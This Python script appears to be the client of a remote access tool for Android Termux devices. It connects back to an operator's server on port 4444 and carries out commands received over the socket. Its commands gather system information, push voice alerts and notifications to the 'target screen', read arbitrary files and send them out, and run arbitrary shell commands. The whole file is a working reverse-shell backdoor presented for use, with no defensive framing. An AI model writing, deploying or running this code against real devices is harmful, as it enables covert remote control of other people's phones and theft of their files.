import socket
import subprocess

def run_client():
    print("""
    =========================================
         HCO ADVANCED CLIENT (v3.0 ACTIVE)   
    =========================================
    """)
    server_ip = input("[?] Enter Server IP (e.g., 192.168.1.10): ").strip()
    port = 4444
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, port))
        print("[+] Connection Established with Server Node!")
    except Exception as e:
        print(f"[-] Initial Connection Failed: {e}")
        return
    
    while True:
        try:
            data = client.recv(4096).decode()
            if not data or data == 'exit':
                break
            
            # Action 1: System Info
            if data == 'sysinfo':
                cmd = "uname -a; echo 'User: '; whoami; echo 'Uptime: '; uptime"
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                
            # Action 2: Voice Alert
            elif data.startswith('alert:'):
                msg = data.split('alert:')[1]
                subprocess.Popen(f"termux-tts-speak '{msg}'", shell=True)
                output = b"Voice Alert triggered successfully!"
                
            # Action 3: File Downloader
            elif data.startswith('download:'):
                file_path = data.split('download:')[1]
                try:
                    with open(file_path, 'rb') as f:
                        output = f.read()
                except Exception as file_err:
                    output = f"File Read Error: {str(file_err)}".encode()
                    
            # Action 4: Push Screen Popup / Notification Note
            elif data.startswith('popup:'):
                note_content = data.split('popup:')[1]
                # Termux notification command jo screen par notification banner ban kar aayega
                notif_cmd = f"termux-notification --title 'HCO Security Alert' --content '{note_content}'"
                subprocess.Popen(notif_cmd, shell=True)
                output = b"Popup note successfully pushed to target screen!"
                
            # Action 5: Custom Shell Command
            elif data.startswith('cmd:'):
                real_cmd = data.split('cmd:')[1]
                output = subprocess.check_output(real_cmd, shell=True, stderr=subprocess.STDOUT)
            else:
                output = b"Unknown payload header."
                
        except Exception as e:
            output = str(e).encode()
            
        client.send(output)
        
    client.close()

if __name__ == "__main__":
    run_client()
